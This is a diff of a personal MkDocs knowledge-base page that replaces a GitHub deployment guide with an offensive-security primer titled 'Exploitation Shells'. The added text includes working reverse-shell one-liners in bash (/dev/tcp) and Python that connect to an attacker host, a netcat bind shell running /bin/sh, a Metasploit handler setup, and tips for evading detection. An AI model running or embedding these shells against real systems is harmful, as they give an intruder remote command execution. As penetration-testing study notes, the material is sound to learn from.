@@ -9,8 +9,10 @@
       
       
       
-        <link rel="prev" href="../create/">
+        <link rel="prev" href="../scanenum/">
       
+      
+        <link rel="next" href="../smb/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -18,7 +20,7 @@
     
     
       
-        <title>Github create & update - My Knowledge Base</title>
+        <title>Shell Exploitation - My Knowledge Base</title>
       
     
     
@@ -68,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#managing-mkdocs-with-github" class="md-skip">
+        <a href="#exploitation-shells" class="md-skip">
           Skip to content
         </a>
       
@@ -104,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Github create & update
+              Shell Exploitation
             
           </span>
         </div>
@@ -488,10 +490,31 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../shell/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Shell Exploitation
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -501,6 +524,236 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      How It Works:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-use-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why Use a Reverse Shell?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-a-listener-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up a Listener (Attacker Machine)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#executing-a-reverse-shell-victim-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Executing a Reverse Shell (Victim Machine)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Executing a Reverse Shell (Victim Machine)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-reverse-shell-bash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux Reverse Shell (Bash)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python Reverse Shell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit Reverse Shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Bind Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Bind Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      How It Works:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-use-a-bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why Use a Bind Shell?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#starting-a-bind-shell-on-victim-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Starting a Bind Shell on Victim Machine
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Starting a Bind Shell on Victim Machine">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux Bind Shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connecting-to-the-bind-shell-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connecting to the Bind Shell (Attacker Machine)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#staged-vs-non-staged-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Staged vs Non-Staged Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Staged vs Non-Staged Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#staged-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Staged Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#non-staged-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Non-Staged Payloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      TIPS:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -551,19 +804,17 @@
       
   
   
-    
   
   
-  
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
         
           
           <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
@@ -578,7 +829,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_18">
             <span class="md-nav__icon md-icon"></span>
             MkDocs
@@ -655,31 +906,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Github create & update
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../github/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -689,95 +919,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#introduction" class="md-nav__link">
-    <span class="md-ellipsis">
-      Introduction
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#creating-a-new-github-repository" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Creating a New GitHub Repository
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="🔹 Creating a New GitHub Repository">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cloning-the-repository" class="md-nav__link">
-    <span class="md-ellipsis">
-      Cloning the Repository
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#updating-mkdocs-and-pushing-to-github" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Updating MkDocs and Pushing to GitHub
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#configuring-github-pages" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Configuring GitHub Pages
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#best-practices" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Best Practices
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -819,26 +960,152 @@
         <li class="md-nav__item">
   <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Introduction
+      🔹 Introduction
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#creating-a-new-github-repository" class="md-nav__link">
+  <a href="#reverse-shell" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Creating a New GitHub Repository
+      🔹 Reverse Shell
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="🔹 Creating a New GitHub Repository">
+    <nav class="md-nav" aria-label="🔹 Reverse Shell">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#cloning-the-repository" class="md-nav__link">
+  <a href="#how-it-works" class="md-nav__link">
     <span class="md-ellipsis">
-      Cloning the Repository
+      How It Works:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-use-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why Use a Reverse Shell?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-a-listener-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up a Listener (Attacker Machine)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#executing-a-reverse-shell-victim-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Executing a Reverse Shell (Victim Machine)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Executing a Reverse Shell (Victim Machine)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-reverse-shell-bash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux Reverse Shell (Bash)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python Reverse Shell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit Reverse Shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Bind Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Bind Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      How It Works:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-use-a-bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why Use a Bind Shell?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#starting-a-bind-shell-on-victim-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Starting a Bind Shell on Victim Machine
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Starting a Bind Shell on Victim Machine">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux-bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux Bind Shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connecting-to-the-bind-shell-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connecting to the Bind Shell (Attacker Machine)
     </span>
   </a>
   
@@ -850,36 +1117,51 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#updating-mkdocs-and-pushing-to-github" class="md-nav__link">
+  <a href="#staged-vs-non-staged-payloads" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Updating MkDocs and Pushing to GitHub
+      🔹 Staged vs Non-Staged Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Staged vs Non-Staged Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#staged-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Staged Payloads
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#configuring-github-pages" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#non-staged-payloads" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Configuring GitHub Pages
+      Non-Staged Payloads
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#best-practices" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Best Practices
+      TIPS:
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#conclusion" class="md-nav__link">
     <span class="md-ellipsis">
-      Conclusion
+      🔹 Conclusion
     </span>
   </a>
   
@@ -901,75 +1183,87 @@
 
 
 
-<h1 id="managing-mkdocs-with-github">Managing MkDocs with GitHub</h1>
-<h2 id="introduction">Introduction</h2>
-<p>Using <strong>GitHub</strong> for version control and deployment is an essential practice when managing MkDocs projects. This guide covers how to <strong>create a new repository</strong>, update documentation, and deploy it to <strong>GitHub Pages</strong>.</p>
+<h1 id="exploitation-shells">Exploitation Shells</h1>
+<h2 id="introduction">🔹 Introduction</h2>
+<p>An <strong>exploitation shell</strong> is a command-line interface established after successfully exploiting a system, allowing an attacker to execute commands remotely. Shells can be categorized into <strong>Reverse Shells</strong> and <strong>Bind Shells</strong>, and they often use different types of <strong>payloads</strong>.</p>
 <hr />
-<h2 id="creating-a-new-github-repository">🔹 Creating a New GitHub Repository</h2>
-<ol>
-<li><strong>Go to GitHub</strong> and log in.</li>
-<li><strong>Click on</strong> <code>+</code> (top-right) → <code>New repository</code>.</li>
-<li><strong>Enter repository details</strong>:</li>
-<li>Repository name: <code>my-mkdocs-site</code></li>
-<li>Description (optional): "Documentation for my project"</li>
-<li>Choose <strong>Public</strong> or <strong>Private</strong>.</li>
-<li>Check <strong>Add a README</strong> (optional).</li>
-<li><strong>Click</strong> <code>Create repository</code>.</li>
-</ol>
-<h3 id="cloning-the-repository">Cloning the Repository</h3>
-<p>After creating the repository, clone it to your local machine:</p>
-<pre><code class="language-bash">git clone https://github.com/your-username/my-mkdocs-site.git
-cd my-mkdocs-site
-</code></pre>
-<hr />
-<h2 id="updating-mkdocs-and-pushing-to-github">🔹 Updating MkDocs and Pushing to GitHub</h2>
-<p>When making changes to MkDocs documentation, follow these steps:</p>
-<ol>
-<li><strong>Stage all changes</strong>:
-   <code>bash
-   git add .</code></li>
-<li><strong>Commit the changes</strong>:
-   <code>bash
-   git commit -m "Added my new page"</code></li>
-<li><strong>Push to GitHub</strong>:
-   <code>bash
-   git push origin main</code></li>
-<li><strong>Deploy the site to GitHub Pages</strong>:
-   <code>bash
-   mkdocs gh-deploy</code></li>
-</ol>
-<pre><code>mkdocs build --clean
-git add .
-git commit -m &quot;comment&quot;
-git push origin main
-mkdocs gh-deploy
-</code></pre>
-<p>This will build and deploy your MkDocs site to <strong>GitHub Pages</strong>.</p>
-<hr />
-<h2 id="configuring-github-pages">🔹 Configuring GitHub Pages</h2>
-<p>Ensure that GitHub Pages is enabled for your repository:</p>
-<ol>
-<li><strong>Go to your repository on GitHub</strong>.</li>
-<li>Navigate to <strong>Settings &gt; Pages</strong>.</li>
-<li>Under <strong>Branch</strong>, select <code>gh-pages</code>.</li>
-<li>Click <strong>Save</strong>.</li>
-<li>Your site will be available at:
-   <code>https://your-username.github.io/my-mkdocs-site/</code></li>
-</ol>
-<hr />
-<h2 id="best-practices">🔹 Best Practices</h2>
+<h2 id="reverse-shell">🔹 Reverse Shell</h2>
+<h3 id="how-it-works"><strong>How It Works:</strong></h3>
+<p>A <strong>Reverse Shell</strong> is when the <strong>target machine</strong> initiates a connection back to the <strong>attacker’s machine</strong>, which is listening for incoming connections.</p>
+<h3 id="why-use-a-reverse-shell"><strong>Why Use a Reverse Shell?</strong></h3>
 <ul>
-<li>Always <strong>commit meaningful messages</strong> (<code>git commit -m "Updated navigation"</code>).</li>
-<li>Regularly <strong>pull updates</strong> from the repository before making changes:
-  <code>bash
-  git pull origin main</code></li>
-<li>Check <strong>Git status</strong> to review changes before committing:
-  <code>bash
-  git status</code></li>
+<li>Useful when the target is behind <strong>NAT</strong> or a <strong>firewall</strong>.</li>
+<li>Attacker controls the session as soon as the target connects.</li>
+</ul>
+<h3 id="setting-up-a-listener-attacker-machine"><strong>Setting Up a Listener (Attacker Machine)</strong></h3>
+<pre><code class="language-bash">nc -lvp 4444
+</code></pre>
+<ul>
+<li><strong><code>-l</code></strong> → Listen mode.</li>
+<li><strong><code>-v</code></strong> → Verbose output (shows connection details).</li>
+<li><strong><code>-p</code></strong> → Specify port (in this case, <code>4444</code>).</li>
+</ul>
+<h3 id="executing-a-reverse-shell-victim-machine"><strong>Executing a Reverse Shell (Victim Machine)</strong></h3>
+<h4 id="linux-reverse-shell-bash"><strong>Linux Reverse Shell (Bash)</strong></h4>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1
+</code></pre>
+<h4 id="python-reverse-shell"><strong>Python Reverse Shell</strong></h4>
+<pre><code class="language-python">import socket, subprocess, os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;192.168.1.100&quot;,4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])
+</code></pre>
+<h4 id="metasploit-reverse-shell"><strong>Metasploit Reverse Shell</strong></h4>
+<pre><code class="language-bash">msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+</code></pre>
+<hr />
+<h2 id="bind-shell">🔹 Bind Shell</h2>
+<h3 id="how-it-works_1"><strong>How It Works:</strong></h3>
+<p>A <strong>Bind Shell</strong> is when the <strong>target machine</strong> opens a specific port and waits for the attacker to connect to it.</p>
+<h3 id="why-use-a-bind-shell"><strong>Why Use a Bind Shell?</strong></h3>
+<ul>
+<li>Useful when the attacker cannot directly reach the target (e.g., strict outbound firewall rules).</li>
+<li>Less common due to <strong>firewall filtering</strong> and detection.</li>
+</ul>
+<h3 id="starting-a-bind-shell-on-victim-machine"><strong>Starting a Bind Shell on Victim Machine</strong></h3>
+<h4 id="linux-bind-shell"><strong>Linux Bind Shell</strong></h4>
+<pre><code class="language-bash">nc -lvnp 4444 -e /bin/sh
+</code></pre>
+<h3 id="connecting-to-the-bind-shell-attacker-machine"><strong>Connecting to the Bind Shell (Attacker Machine)</strong></h3>
+<pre><code class="language-bash">nc 192.168.1.100 4444
+</code></pre>
+<hr />
+<h2 id="staged-vs-non-staged-payloads">🔹 Staged vs Non-Staged Payloads</h2>
+<h3 id="staged-payloads"><strong>Staged Payloads</strong></h3>
+<ul>
+<li><strong>Delivers the payload in small parts</strong> to avoid detection.</li>
+<li>The first-stage shell establishes a connection and downloads a <strong>larger second stage payload</strong>.</li>
+<li><strong>Example:</strong> <code>windows/meterpreter/reverse_tcp</code></li>
+</ul>
+<h3 id="non-staged-payloads"><strong>Non-Staged Payloads</strong></h3>
+<ul>
+<li>The entire payload is <strong>sent in one go</strong>.</li>
+<li>Faster but easier to detect.</li>
+<li><strong>Example:</strong> <code>windows/meterpreter_reverse_tcp</code></li>
+</ul>
+<h3 id="tips"><strong>TIPS:</strong></h3>
+<ul>
+<li>If one payload <strong>fails</strong>, try another variant.</li>
+<li>Different OS versions may require different shell techniques.</li>
+<li><strong>Use encrypted shells (SSL/TLS) to avoid detection.</strong></li>
+<li><strong>Try different ports</strong> (some are blocked by firewalls).</li>
 </ul>
 <hr />
-<h2 id="conclusion">Conclusion</h2>
-<p>Using GitHub for MkDocs makes it easy to manage documentation changes and deploy updates. By following these steps, you can keep your project well-organized and version-controlled.</p>
+<h2 id="conclusion">🔹 Conclusion</h2>
+<p>Understanding <strong>Reverse Shells, Bind Shells, and Payload Types</strong> is crucial in exploitation. Using the right payload and technique can help bypass security defenses and maintain access.</p>
 
 
 
